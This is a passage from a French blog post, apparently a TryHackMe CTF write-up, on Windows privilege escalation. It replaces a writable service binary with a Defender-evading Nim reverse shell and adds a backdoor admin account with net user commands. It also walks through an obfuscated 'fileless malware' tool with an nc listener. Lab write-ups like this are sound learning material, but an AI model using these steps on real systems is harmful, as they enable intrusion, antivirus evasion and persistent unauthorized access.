alt="winPEAS fails because of Windows Defender"></p><p><a href=https://github.com/itm4n/PrivescCheck/tree/master>PrivescCheck</a> par contre fonctionne sans être stoppé par Defender.</p><p><img src=/images/THM-HackSmarterSecurity/privesccheck.png alt="PrivescCheck works despite Microsoft Defender"></p><p>Quelques services différents de ceux proposés par défaut sont trouvés.</p><p><img src=/images/THM-HackSmarterSecurity/non-default-services.png alt="A few non-default services are discovered"></p><p>Dans la section <code>Services binary permissions</code> nous trouvons un service vulnérable appelé <code>spoofer-scheduler</code>. Il est potentiellement possible de remplacer <code>spoofer-scheduler.exe</code> par un fichier malveillant du même nom afin d&rsquo;élever nos privilèges puisque l&rsquo;utilisateur <code>tyler</code> dispose de toutes les permissions nécessaires.</p><p><img src=/images/THM-HackSmarterSecurity/vulnerable-service.png alt="Vulnerable service found"></p><p>Nous devons tenir compte du fait que Windows Defender est actif, si le reverse shell n&rsquo;est pas assez furtif, il sera repéré. Nous disposons de plusieurs moyens pour atteindre notre objectif.</p><p>Un reverse shell écrit en Nim qui échappe à Windows Defender est disponible <a href=https://github.com/Sn1r/Nim-Reverse-Shell>ici</a>.</p><p>Nous arrêtons le service avec <code>Stop-Service -Name "spoofer-scheduler"</code> et nous supprimons le fichier exécutable avec <code>rm spoofer-scheduler.exe</code>.</p><blockquote><p>N&rsquo;oubliez pas de compiler le reverse shell avec <code>nim c -d:mingw --app:gui rev_shell.nim</code>.</p></blockquote><p>Le reverse shell est transféré à la cible après la compilation.</p><p><img src=/images/THM-HackSmarterSecurity/malicious-exe.png alt="Malicious executable file on the target"></p><p>Après le redémarrage du service avec <code>Start-Service -Name "spoofer-scheduler"</code> nous obtenons un reverse shell avec un compte privilégié.</p><p><img src=/images/THM-HackSmarterSecurity/privileged-shell.png alt="Privileged shell obtained"></p><p>Mais le shell est instable et expire rapidement. Étant donné que le service ne démarre pas correctement (à cause du remplacement du fichier), Windows l&rsquo;arrête prématurément.</p><p><img src=/images/THM-HackSmarterSecurity/service-error.png alt="Service cannot be started and gets timed out"></p><p>Pour établir la persistance, un nouvel utilisateur peut rapidement être créé et ajouté au groupe <code>administrators</code> pour obtenir les privilèges d&rsquo;administrateur.</p><pre tabindex=0><code>net user &lt;username&gt; &lt;password&gt; /add
net localgroup administrators &lt;username&gt; /add
</code></pre><p><img src=/images/THM-HackSmarterSecurity/persistence-account.png alt="Persistence is achieved via the creation of a new privileged user"></p><p>Le compte nouvellement créé peut être utilisé pour accéder au système via SSH.</p><p><img src=/images/THM-HackSmarterSecurity/persistence-account-privs.png alt="Privileges of the newly created admin account"></p><h4 id=which-organizations-is-the-hack-smarter-group-targeting-next>Which organizations is the Hack Smarter group targeting next?</h4><p>Avec les privilèges d&rsquo;administrateur, nous pouvons accéder à la liste des prochaines cibles à l&rsquo;adresse <code>C:\Users\Administrator\Desktop\Hacking-Targets\hacking-targets.txt</code>.</p><p><img src=/images/THM-HackSmarterSecurity/hacking-targets.png alt="Hackers&rsquo; targets list"></p><h3 id=utilisation-dun-fileless-malware>Utilisation d&rsquo;un fileless malware</h3><p>Une autre méthode pour échapper à Windows Defender consiste à utiliser <a href=https://github.com/daniellowrie/update_script>SecUp</a>. Il s&rsquo;agit d&rsquo;un &ldquo;fileless malware&rdquo; qui contourne Windows Defender en utilisant PowerShell et l&rsquo;obscurcissement". Vous pouvez consulter la <a href="https://www.youtube.com/watch?v=LjoAV3O40og&amp;ab_channel=DanielLowrie">vidéo YouTube</a> pour obtenir des explications.</p><ol><li>Cloner le répertoire</li></ol><pre tabindex=0><code>git clone https://github.com/daniellowrie/update_script
</code></pre><ol start=2><li>Démarrer le programme. Il configure également un serveur HTTP pour transférer les fichiers malveillants.</li></ol><pre tabindex=0><code>go run SecUp.go 10.2.104.130
</code></pre><p><img src=/images/THM-HackSmarterSecurity/go-run.png alt="go run command"></p><ol start=3><li>Mettre en place un listener sur le port 443</li></ol><pre tabindex=0><code>nc -lnvp 443
</code></pre><ol start=4><li>Le processus de compilation crée un fichier nommé <code>update_script.exe</code></li></ol><pre tabindex=0><code>GOOS=windows go build update_script.go
</code></pre><p><img src=/images/THM-HackSmarterSecurity/malware-exe.png alt="files compilation"></p><ol start=5><li>Renommez le fichier malveillant <code>spoofer-scheduler.exe</code> pour qu&rsquo;il fonctionne sur la cible.</li></ol><pre tabindex=0><code>mv update_script.exe spoofer-scheduler.exe
</code></pre><p>Sur la cible, arrêtez le service, remplacez le fichier légitime par votre fichier malveillant et redémarrez le service. Vous devriez voir les fichiers être transférés sur le serveur cible.</p><p><img src=/images/THM-HackSmarterSecurity/malware-success.png alt="Malware working successfully"></p><p>Sur le listener, nous obtenons un shell avec des privilèges d&rsquo;administrateur qui n&rsquo;expire pas.</p><p><img src=/images/THM-HackSmarterSecurity/admin-shell.png alt="Stable shell that does not die received"></p><p>J&rsquo;espère que cet article vous a été utile et qu&rsquo;il vous a permis d&rsquo;apprendre de nouvelles choses. Il existe de nombreuses autres façons d&rsquo;échapper aux antivirus/EDR, tel que <a href=https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/>AMSI Bypass</a>, je vous encourage à apprendre et à pratiquer différentes méthodes. Si vous aimez les livres, je vous recommande vivement <a href=https://www.amazon.com/Evading-EDR-Definitive-Defeating-Detection/dp/1718503342>Evading EDR: The Definitive Guide to Defeating Endpoint Detection Systems</a> et <a href=https://www.amazon.com/Antivirus-Bypass-Techniques-practical-techniques/dp/1801079749>Antivirus Bypass Techniques</a>.</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-manager/>&#8592;
Précédent:
HTB: Manager</a></p><p class=prev-post-date>mars 15, 2024</p></div><div class=next-post><p><a href=/fr/posts/htb-analytics/>Suivant:
HTB: Analytics
&#8594;</a></p><p class=next-post-date>mars 23, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#reconnaissance>Reconnaissance</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#foothold>Foothold</a><ul><li><a href=#what-is-usertxt>What is user.txt?</a></li></ul></li><li><a href=#escalade-de-privilèges>Escalade de privilèges</a><ul><li><a href=#création-dun-nouveau-compte-administrateur>Création d&rsquo;un nouveau compte administrateur</a><ul><li><a href=#which-organizations-is-the-hack-smarter-group-targeting-next>Which organizations is the Hack Smarter group targeting next?</a></li></ul></li><li><a href=#utilisation-dun-fileless-malware>Utilisation d&rsquo;un fileless malware</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>